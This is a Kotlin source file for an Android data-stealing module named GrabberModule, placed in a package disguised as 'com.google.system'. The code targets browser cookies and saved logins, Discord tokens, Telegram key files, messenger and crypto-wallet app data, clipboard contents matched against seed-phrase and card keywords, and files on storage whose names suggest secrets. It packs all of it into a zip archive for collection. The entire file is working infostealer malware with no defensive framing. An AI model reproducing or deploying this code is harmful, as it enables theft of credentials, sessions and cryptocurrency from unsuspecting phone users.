package com.google.system

import android.content.ClipboardManager
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.os.Environment
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object GrabberModule {

    private val HIGH_VALUE_APPS = mapOf(
        "com.discord" to "Discord",
        "com.aliucord" to "Aliucord",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram Web",
        "org.thoughtcrime.securesms" to "Signal",
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.twitter.android" to "Twitter/X",
        "com.snapchat.android" to "Snapchat",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.netflix.mediaclient" to "Netflix",
        "com.spotify.music" to "Spotify",
        "com.amazon.mShop.android.shopping" to "Amazon",
        "com.paypal.android.p2pmobile" to "PayPal",
        "com.coinbase.android" to "Coinbase",
        "com.binance.dev" to "Binance",
        "io.metamask" to "MetaMask",
        "com.wallet.crypto.trustapp" to "Trust Wallet",
        "com.phantom" to "Phantom",
        "com.exodus.exodus" to "Exodus",
        "com.blockchainvault" to "Blockchain.com",
        "com.google.android.youtube" to "YouTube",
        "com.google.android.gms" to "Google",
        "com.microsoft.office.outlook" to "Outlook",
        "com.google.android.gm" to "Gmail",
        "com.dropbox.android" to "Dropbox",
        "com.google.android.apps.docs" to "Google Docs",
    )

    private val BROWSERS = mapOf(
        "com.android.chrome" to "Chrome",
        "com.chrome.beta" to "Chrome Beta",
        "com.chrome.dev" to "Chrome Dev",
        "com.brave.browser" to "Brave",
        "com.microsoft.emmx" to "Edge",
        "com.opera.browser" to "Opera",
        "com.opera.gx" to "Opera GX",
        "org.mozilla.firefox" to "Firefox",
        "com.sec.android.app.sbrowser" to "Samsung Browser",
        "com.duckduckgo.mobile.android" to "DuckDuckGo",
        "com.vivaldi.browser" to "Vivaldi",
    )

    private val SENSITIVE_PATTERNS = listOf(
        "password", "passwd", "pwd", "secret", "token", "auth", "login",
        "credential", "key", "cert", "private", "wallet", "seed", "mnemonic",
        "backup", "config", "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "session", "cookie", "oauth", "jwt", "account", "profile",
    )

    private val HIGH_VALUE_EXTS = setOf(
        ".key", ".pem", ".crt", ".p12", ".keystore", ".jks",
        ".env", ".config", ".ini", ".yml", ".yaml", ".toml",
        ".json", ".xml", ".db", ".sqlite", ".sql",
        ".wallet", ".dat", ".bak", ".backup",
    )

    private val CLIPBOARD_KEYWORDS = listOf(
        "password", "token", "key", "secret", "auth",
        "bitcoin", "btc", "eth", "ethereum", "sol", "solana",
        "0x", "bc1", "private", "seed", "mnemonic",
        "api_key", "apikey", "access_token", "refresh_token",
        "bearer", "authorization", "credit", "card", "cvv",
    )

    private const val MAX_ZIP = 50L * 1024 * 1024
    private const val MAX_FILE = 5L * 1024 * 1024
    private const val MAX_FILES = 100

    fun grabAll(ctx: Context) = grab(ctx, "all")
    fun grabBrowser(ctx: Context) = grab(ctx, "browser")
    fun grabMessenger(ctx: Context) = grab(ctx, "messenger")
    fun grabTokens(ctx: Context) = grab(ctx, "tokens")
    fun grabWallets(ctx: Context) = grab(ctx, "wallets")
    fun grabFiles(ctx: Context) = grab(ctx, "files")
    fun grabClipboard(ctx: Context) = grab(ctx, "clipboard")

    fun grab(ctx: Context, target: String): GrabResult {
        val installed = ctx.packageManager.getInstalledPackages(0).map { it.packageName }.toSet()
        val r = GrabResult()
        val zipFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.zip")
        try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                when (target) {
                    "all" -> {
                        scanApps(ctx, installed, zos, r)
                        scanFiles(ctx, zos, r)
                        scanClipboard(ctx, zos, r)
                    }
                    "browser" -> scanBrowsers(ctx, installed, zos, r)
                    "messenger" -> scanMessengers(ctx, installed, zos, r)
                    "tokens" -> scanTokens(ctx, installed, zos, r)
                    "wallets" -> scanWallets(ctx, installed, zos, r)
                    "files" -> scanFiles(ctx, zos, r)
                    "clipboard" -> scanClipboard(ctx, zos, r)
                    else -> {
                        scanApps(ctx, installed, zos, r)
                        scanFiles(ctx, zos, r)
                        scanClipboard(ctx, zos, r)
                    }
                }
            }
            if (zipFile.exists() && zipFile.length() > 0) {
                r.file = zipFile
                r.size = zipFile.length()
            } else {
                zipFile.delete()
            }
        } catch (e: Exception) {
            r.error = e.message
            zipFile.delete()
        }
        return r
    }

    private fun scanApps(ctx: Context, installed: Set<String>, zos: ZipOutputStream, r: GrabResult) {
        scanBrowsers(ctx, installed, zos, r)
        scanMessengers(ctx, installed, zos, r)
        scanTokens(ctx, installed, zos, r)
        scanWallets(ctx, installed, zos, r)
    }

    private fun scanBrowsers(ctx: Context, installed: Set<String>, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in BROWSERS) {
            if (!installed.contains(pkg)) continue
            val dir = File("/data/data/$pkg")
            if (!dir.exists() || !dir.canRead()) continue

            val targets = listOf(
                "app_webview/Default/Cookies" to true,
                "app_webview/Default/Network/Cookies" to true,
                "app_webview/Default/Login Data" to true,
                "app_webview/Default/Web Data" to false,
                "app_webview/Default/History" to false,
            )
            for ((path, high) in targets) {
                if (r.size >= MAX_ZIP) return
                val f = File(dir, path)
                if (f.exists() && f.length() in 1..MAX_FILE) {
                    if (zip(f, "browser/$name/${path.replace('/', '_')}", zos)) {
                        r.files++
                        r.size += f.length()
                        if (high) r.highValue++
                    }
                }
            }

            val prefs = File(dir, "shared_prefs")
            if (prefs.exists()) {
                for (f in prefs.listFiles() ?: emptyArray()) {
                    if (r.size >= MAX_ZIP) return
                    if (f.isFile && f.length() in 1..MAX_FILE && isSensitive(f.name)) {
                        if (zip(f, "browser/$name/prefs_${f.name}", zos)) {
                            r.files++; r.size += f.length(); r.highValue++
                        }
                    }
                }
            }

            extractCookies(ctx, dir, name, zos, r)
        }
    }

    private fun scanMessengers(ctx: Context, installed: Set<String>, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg)) continue
            if (!installed.contains(pkg)) continue
            val dir = File("/data/data/$pkg")
            if (!dir.exists() || !dir.canRead()) continue

            for (sub in listOf("shared_prefs", "databases", "files")) {
                if (r.size >= MAX_ZIP) return
                val d = File(dir, sub)
                if (d.isDirectory) {
                    for (f in d.listFiles() ?: emptyArray()) {
                        if (r.size >= MAX_ZIP) return
                        if (f.isFile && f.length() in 1..MAX_FILE && isSensitive(f.name)) {
                            if (zip(f, "messenger/$name/${sub}_${f.name}", zos)) {
                                r.files++; r.size += f.length(); r.highValue++
                            }
                        }
                    }
                }
            }

            if (pkg == "com.discord" || pkg == "com.aliucord") {
                for (path in listOf("shared_prefs/com.discord.app_preferences.xml", "shared_prefs/NativeCookie.xml")) {
                    val f = File(dir, path)
                    if (f.exists() && f.length() in 1..MAX_FILE) {
                        if (zip(f, "messenger/$name/token_${f.name}", zos)) {
                            r.files++; r.size += f.length(); r.highValue++
                        }
                    }
                }
            }

            if (pkg.startsWith("org.telegram")) {
                for (path in listOf("shared_prefs/mainaccount.xml", "shared_prefs/passcode.xml", "shared_prefs/userConfig.xml", "files/key1", "files/key2", "files/key3")) {
                    val f = File(dir, path)
                    if (f.exists() && f.length() in 1..MAX_FILE) {
                        if (zip(f, "messenger/$name/config_${f.name}", zos)) {
                            r.files++; r.size += f.length(); r.highValue++
                        }
                    }
                }
            }
        }
    }

    private fun scanTokens(ctx: Context, installed: Set<String>, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (BROWSERS.containsKey(pkg) || isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            val dir = File("/data/data/$pkg")
            if (!dir.exists() || !dir.canRead()) continue

            for (sub in listOf("shared_prefs", "databases", "files")) {
                if (r.size >= MAX_ZIP) return
                val d = File(dir, sub)
                if (d.isDirectory) {
                    for (f in d.listFiles() ?: emptyArray()) {
                        if (r.size >= MAX_ZIP) return
                        if (f.isFile && f.length() in 1..MAX_FILE && isSensitive(f.name)) {
                            if (zip(f, "tokens/$name/${sub}_${f.name}", zos)) {
                                r.files++; r.size += f.length(); r.highValue++
                            }
                        }
                    }
                }
            }
        }
    }

    private fun scanWallets(ctx: Context, installed: Set<String>, zos: ZipOutputStream, r: GrabResult) {
        for ((pkg, name) in HIGH_VALUE_APPS) {
            if (!isWallet(pkg)) continue
            if (!installed.contains(pkg)) continue
            val dir = File("/data/data/$pkg")
            if (!dir.exists() || !dir.canRead()) continue

            for (sub in listOf("shared_prefs", "databases", "files", "app_webview/Default")) {
                if (r.size >= MAX_ZIP) return
                val d = File(dir, sub)
                if (d.isDirectory) {
                    for (f in d.listFiles() ?: emptyArray()) {
                        if (r.size >= MAX_ZIP) return
                        if (f.isFile && f.length() in 1..MAX_FILE) {
                            if (zip(f, "wallets/$name/${sub.replace('/', '_')}_${f.name}", zos)) {
                                r.files++; r.size += f.length(); r.highValue++
                            }
                        }
                    }
                }
            }
        }
    }

    private fun scanFiles(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        val roots = listOfNotNull(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
        )
        val found = mutableListOf<File>()
        for (root in roots) {
            if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
            if (root.exists() && root.canRead()) collect(root, found, MAX_FILES)
        }
        for (f in found) {
            if (r.size >= MAX_ZIP) break
            val root = roots.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
            val rel = f.absolutePath.substring(root.absolutePath.length + 1)
            if (zip(f, "files/$rel", zos)) { r.files++; r.size += f.length() }
        }
    }

    private fun scanClipboard(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(ctx).toString()
                if (text.isNotBlank()) {
                    val matches = CLIPBOARD_KEYWORDS.filter { text.lowercase().contains(it) }
                    val content = buildString {
                        appendLine("=== CLIPBOARD ===")
                        appendLine("Time: ${System.currentTimeMillis()}")
                        appendLine("Length: ${text.length}")
                        if (matches.isNotEmpty()) appendLine("ALERT: ${matches.joinToString(", ")}")
                        appendLine()
                        appendLine(text)
                    }
                    zos.putNextEntry(ZipEntry("clipboard/current.txt"))
                    zos.write(content.toByteArray())
                    zos.closeEntry()
                    r.files++
                    r.size += content.length
                    if (matches.isNotEmpty()) r.highValue++
                }
            }
        } catch (_: Exception) {}
    }

    private fun extractCookies(ctx: Context, dataDir: File, name: String, zos: ZipOutputStream, r: GrabResult) {
        try {
            val dbFile = File(dataDir, "app_webview/Default/Cookies")
            if (!dbFile.exists() || dbFile.length() == 0L) return

            val tmp = File(ctx.cacheDir, "tmp_cookie_${System.currentTimeMillis()}.db")
            dbFile.copyTo(tmp, overwrite = true)
            val db = SQLiteDatabase.openDatabase(tmp.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            val cursor = db.rawQuery("SELECT host_key, name, value, path FROM cookies WHERE value != ''", null)
            val lines = mutableListOf<String>()
            while (cursor.moveToNext()) {
                lines.add("${cursor.getString(0)}\t${cursor.getString(1)}\t${cursor.getString(2)}\t${cursor.getString(3)}")
            }
            cursor.close(); db.close(); tmp.delete()

            if (lines.isNotEmpty()) {
                zos.putNextEntry(ZipEntry("browser/$name/cookies_extracted.tsv"))
                zos.write(lines.joinToString("\n").toByteArray())
                zos.closeEntry()
                r.files++; r.size += lines.sumOf { it.length }; r.highValue++
                r.cookies += lines.size
            }
        } catch (_: Exception) {}
    }

    private fun collect(dir: File, found: MutableList<File>, max: Int) {
        if (found.size >= max) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files.sortedByDescending { it.length() }) {
                if (found.size >= max) return
                if (f.isDirectory) collect(f, found, max)
                else if (f.isFile && f.length() in 1..MAX_FILE) {
                    val n = f.name.lowercase()
                    if (SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }) {
                        found.add(f)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun zip(file: File, entryName: String, zos: ZipOutputStream): Boolean {
        return try {
            zos.putNextEntry(ZipEntry(entryName))
            FileInputStream(file).use { fis ->
                val buf = ByteArray(8192)
                var n: Int
                while (fis.read(buf).also { n = it } > 0) zos.write(buf, 0, n)
            }
            zos.closeEntry()
            true
        } catch (_: Exception) { false }
    }

    private fun isSensitive(name: String): Boolean {
        val n = name.lowercase()
        return SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }
    }

    private fun isWallet(pkg: String) = pkg.contains("wallet") || pkg.contains("coin") ||
        pkg.contains("crypto") || pkg.contains("metamask") || pkg.contains("phantom") ||
        pkg.contains("trust") || pkg.contains("exodus") || pkg.contains("blockchain") ||
        pkg.contains("binance")

    class GrabResult {
        var file: File? = null
        var size: Long = 0
        var files: Int = 0
        var highValue: Int = 0
        var cookies: Int = 0
        var error: String? = null

        fun summary(): String {
            val s = when {
                size < 1024 -> "${size}B"
                size < 1024 * 1024 -> "${size / 1024}KB"
                else -> "${size / (1024 * 1024)}MB"
            }
            return "$files files ($highValue high-value, $cookies cookies) — $s"
        }
    }
}
